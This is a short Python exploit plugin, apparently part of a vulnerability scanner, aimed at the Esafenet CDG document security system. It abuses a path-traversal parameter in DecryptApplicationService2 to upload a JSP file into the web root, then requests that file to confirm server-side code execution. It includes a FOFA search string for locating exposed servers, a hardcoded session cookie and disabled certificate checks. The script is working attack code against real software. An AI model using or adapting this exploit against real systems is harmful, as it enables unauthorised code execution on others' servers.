#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/t7cc5ilJONWDvaNHZQqlUQ',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '漏亿赛通电子文档安全管理系统文件上传',

      'level'     :   'high',

      'FOFA'      :   'app="亿赛通-电子文档安全管理系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(8)
  r1 = randomLowercase(20)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Cookie':'JSESSIONID=E13D850E18BD224E56ABE1DC1D4FD13D',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-User': '?1',
      'Sec-Fetch-Dest': 'document',
      'Accept-Encoding': 'gzip, deflate',
      }
  target = f'/CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/{r0}.jsp'
  data = f'<%out.print({r1});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
  url1 = url + target
  try:
    resp=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    resp.close()
  except:
    return ret
  try:
    payload = url + f'/{r0}.jsp'
    res=requests.get(url=payload,headers=headers,timeout=5,verify=False) 
    # print(res.text)
    if r1 in res.text:
      ret['huixian'] = f'漏洞验证地址:{payload},文件内容为：{r1}'
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret